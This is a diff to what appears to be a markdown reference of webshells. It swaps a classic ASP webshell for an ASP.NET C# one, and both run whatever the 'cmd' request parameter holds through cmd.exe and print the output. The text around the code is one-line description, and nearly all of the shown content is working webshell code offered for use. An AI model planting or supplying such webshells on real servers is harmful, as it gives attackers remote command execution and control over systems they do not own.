@@ -69,14 +69,24 @@ This Python webshell uses Flask to run system commands via HTTP requests.
 ## ASP Webshell
 
 ```
-<%
-Set shell = Server.CreateObject("WScript.Shell")
-cmd = Request.QueryString("cmd")
-If cmd <> "" Then
-    Set exec = shell.Exec("cmd.exe /c " & cmd)
-    Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
-End If
-%>
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        string cmd = Request["cmd"];
+        if (!string.IsNullOrEmpty(cmd))
+        {
+            Process proc = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "/c " + cmd;
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+            Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+        }
+    }
+</script>
 ```
 
 This ASP webshell executes system commands using `cmd.exe` and displays the output.
